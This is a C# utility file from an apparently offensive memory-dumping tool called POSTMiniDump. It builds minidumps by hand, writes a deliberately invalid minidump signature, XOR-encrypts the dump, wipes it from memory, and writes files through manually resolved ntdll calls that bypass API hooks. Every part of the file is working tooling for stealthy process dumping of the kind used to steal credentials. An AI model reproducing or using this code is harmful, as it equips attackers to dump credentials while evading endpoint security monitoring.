using System;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using DInvoke = DCall.DynamicInvoke;
using Data = DCall.Data;

namespace POSTMiniDump
{
    public static class Utils
    {
        [DllImport("kernel32.dll", EntryPoint = "CopyMemory", SetLastError = false)]
        static extern void CopyMemory(IntPtr dest, IntPtr src, uint count);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool HeapFree(IntPtr hHeap, uint dwFlags, IntPtr lpMem);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, uint dwBytes);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcessHeap();

        [DllImport("Kernel32.dll", EntryPoint = "RtlZeroMemory", SetLastError = false)]
        static extern void RtlZeroMemory(IntPtr dest, ulong size);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("msvcrt.dll", EntryPoint = "memcpy", CallingConvention = CallingConvention.Cdecl, SetLastError = false)]
        static extern IntPtr memcpy(IntPtr dest, IntPtr src, uint count);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtCreateFile(out SafeFileHandle FileHadle, Data.FileAccess DesiredAcces, ref Data.OBJECT_ATTRIBUTES ObjectAttributes, ref Data.IO_STATUS_BLOCK IoStatusBlock, ref long AllocationSize, System.IO.FileAttributes FileAttributes, System.IO.FileShare ShareAccess, uint CreateDisposition, uint CreateOptions, IntPtr EaBuffer, uint EaLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtWriteFile(Microsoft.Win32.SafeHandles.SafeFileHandle handle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, out Data.IO_STATUS_BLOCK IoStatusBlock, IntPtr Buffer, long Length, uint ByteOffset, uint key);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true,CharSet = CharSet.Unicode)]
        delegate void RtlInitUnicodeString(ref Data.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtFreeVirtualMemory(IntPtr prochandle, ref IntPtr baseaddr, ref ulong RegionSize, uint freetype);


        public static IntPtr RVA(IntPtr baseaddr, long rva)
        {
            return new IntPtr(baseaddr.ToInt64() + (long)rva);
        }

        public static void writeat(Data.dump_context dc, long rva, IntPtr data, uint size)
        {
            IntPtr dst = RVA(dc.BaseAddress, (long)rva);
            memcpy(dst, data, size);
        }

        public static bool append(Data.dump_context dc, IntPtr data, uint size)
        {
            if ((dc.rva + size) < dc.rva)
            {
                Console.WriteLine("The dump size exceeds the 32-bit address space!");
                return false;
            }
            else if ((ulong)(dc.rva + size) >= dc.DumpMaxSize)
            {
                Console.WriteLine("The dump is too big, please increase DUMP_MAX_SIZE.");
                return false;
            }
            else
            {
                writeat(dc, dc.rva, data, size);
                dc.rva += size;
                return true;
            }
        }


        public static bool intFree(IntPtr address)
        {
            return HeapFree(GetProcessHeap(), 0, address);
        }

        public static IntPtr intAlloc(uint size)
        {
            IntPtr addr = IntPtr.Zero;
            addr = HeapAlloc(GetProcessHeap(), 0x00000008, size);
            return addr;
        }

        public static void MemCopy(IntPtr dest, IntPtr source, uint count)
        {
            GCHandle handle0 = GCHandle.Alloc(source, GCHandleType.Pinned);
            IntPtr buffer = handle0.AddrOfPinnedObject();
            CopyMemory(dest, buffer, count);
            handle0.Free();
        }


        public static void MemCopy(IntPtr dest, short source, uint count)
        {
            GCHandle handle2 = GCHandle.Alloc(source, GCHandleType.Pinned);
            IntPtr buffer = (IntPtr)handle2.AddrOfPinnedObject();
            CopyMemory(dest, buffer, count);
            handle2.Free();
        }

        public static void MemCopy(IntPtr dest, ulong source, uint count)
        {
            GCHandle handle3 = GCHandle.Alloc(source, GCHandleType.Pinned);
            IntPtr buffer = (IntPtr)handle3.AddrOfPinnedObject();
            CopyMemory(dest, buffer, count);
            handle3.Free();
        }

        
        public static void generate_invalid_sig(out uint Signature, out uint Version, out ushort ImplementationVersion)
        {
            Random rng = new Random(DateTime.Now.Millisecond);

            Signature = Data.MINIDUMP_SIGNATURE;
            Version = Data.MINIDUMP_VERSION;
            ImplementationVersion = Data.MINIDUMP_IMPL_VERSION;

            while (Signature == Data.MINIDUMP_SIGNATURE || Version == Data.MINIDUMP_VERSION || ImplementationVersion == Data.MINIDUMP_IMPL_VERSION)
            {
               
                Signature = (uint)rng.Next();
                Signature |= (Signature & 0x7FFF) << 0x11;
                Signature |= (Signature & 0x7FFF) << 0x02;
                Signature |= (Signature & 0x0003) << 0x00;

                Version = (uint)rng.Next();
                Version |= (Version & 0xFF) << 0x08;
                Version |= (Version & 0xFF) << 0x00;

                ImplementationVersion = (ushort)rng.Next();
                ImplementationVersion |= (ushort)((ImplementationVersion & 0xFF) << 0x08);
                ImplementationVersion |= (ushort)((ImplementationVersion & 0xFF) << 0x00);
                
            }
        }
        
        public static void encrypt_dump(IntPtr baseaddr, long RegionSize)
        {
            byte key = 0x6f;
            IntPtr addr = (IntPtr)0;

            if (baseaddr == IntPtr.Zero)
                return;

            for (int i = 0; i < RegionSize; i++)
            {
                addr = RVA(baseaddr, i);
                byte Xbyte = Marshal.ReadByte(addr);
                Xbyte ^= key;
                Marshal.WriteByte(addr, Xbyte);
            }
        }

        public static void erase_dump_from_memory(IntPtr baseaddr, ulong RegionSize, DCall.Data.PE.PE_MANUAL_MAP moduleDetails)
        {
            RtlZeroMemory(baseaddr, RegionSize);
            RegionSize = 0;
            IntPtr p = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "NtFreeVirtualMemory");
            NtFreeVirtualMemory NTFVM = (NtFreeVirtualMemory)Marshal.GetDelegateForFunctionPointer(p, typeof(NtFreeVirtualMemory));
            Data.NTSTATUS status = NTFVM(GetCurrentProcess(), ref baseaddr, ref RegionSize, 0x8000);
            if (status != Data.NTSTATUS.Success)
            {
                Console.WriteLine("Failed to release virtual memory");
                return;
            }

            //Console.WriteLine("Dumped erased from allocated memory.");

        }

        private static Data.UNICODE_STRING GetDumpFullPath(string DumpPath, DCall.Data.PE.PE_MANUAL_MAP moduleDetails)
        {
            Data.UNICODE_STRING full_dump_path_uni = new Data.UNICODE_STRING();
            string full_dump_path = "";
            string currentDir = Environment.CurrentDirectory;
            if ( DumpPath.Contains(@":\"))
            {
                full_dump_path =  DumpPath;
            }
            else
            {
                full_dump_path = currentDir + @"\" + DumpPath;
            }

            IntPtr p = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "RtlInitUnicodeString");
            RtlInitUnicodeString RTUS = (RtlInitUnicodeString)Marshal.GetDelegateForFunctionPointer(p, typeof(RtlInitUnicodeString));
            RTUS(ref full_dump_path_uni, @"\??\" + full_dump_path);

            return full_dump_path_uni;
        }

        public static bool WriteFile(string DumpPath, IntPtr fileData, long fileLength, DCall.Data.PE.PE_MANUAL_MAP moduleDetails)
        {
            IntPtr stub = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "NtCreateFile");
            NtCreateFile NTCF = (NtCreateFile)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateFile));
            Data.UNICODE_STRING full_dump_path = GetDumpFullPath(DumpPath, moduleDetails);

            SafeFileHandle hFile;
            Data.IO_STATUS_BLOCK IoStatusBlock = new Data.IO_STATUS_BLOCK();
            IntPtr objName = Marshal.AllocHGlobal(Marshal.SizeOf(full_dump_path));
            Marshal.StructureToPtr(full_dump_path, objName, true);

            Data.OBJECT_ATTRIBUTES objAttr = new Data.OBJECT_ATTRIBUTES()
            {
                Length = Marshal.SizeOf(typeof(Data.OBJECT_ATTRIBUTES)),
                RootDirectory = IntPtr.Zero,
                ObjectName = objName,
                Attributes = 0x00000040,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = IntPtr.Zero
            };

            Data.NTSTATUS status = NTCF(out hFile, Data.FileAccess.FILE_GENERIC_WRITE, ref objAttr, ref IoStatusBlock, ref fileLength, System.IO.FileAttributes.Normal, System.IO.FileShare.None, 0x00000005, 0x00000020, IntPtr.Zero, 0);

            if (status == Data.NTSTATUS.ObjectPathNotFound ||  status == Data.NTSTATUS.ObjectNameInvalid)
            {
                Console.WriteLine($"The path {full_dump_path} is invalid.");
                return false;
            }

            if (status != Data.NTSTATUS.Success)
            {
                Console.WriteLine($"Could not create file {full_dump_path}, error: {status.ToString()}");
                return false;
            }

            IntPtr p2 = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "NtWriteFile");
            NtWriteFile NTWF = (NtWriteFile)Marshal.GetDelegateForFunctionPointer(p2, typeof(NtWriteFile));
            Data.NTSTATUS status2 = NTWF(hFile, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out IoStatusBlock, fileData, fileLength, 0, 0);
            if (status2 != Data.NTSTATUS.Success)
            {
                Console.WriteLine($"Could not write the dump {full_dump_path}, error: {status2.ToString()}");
                return false;
            }
            
            return true;
        }
    }
}
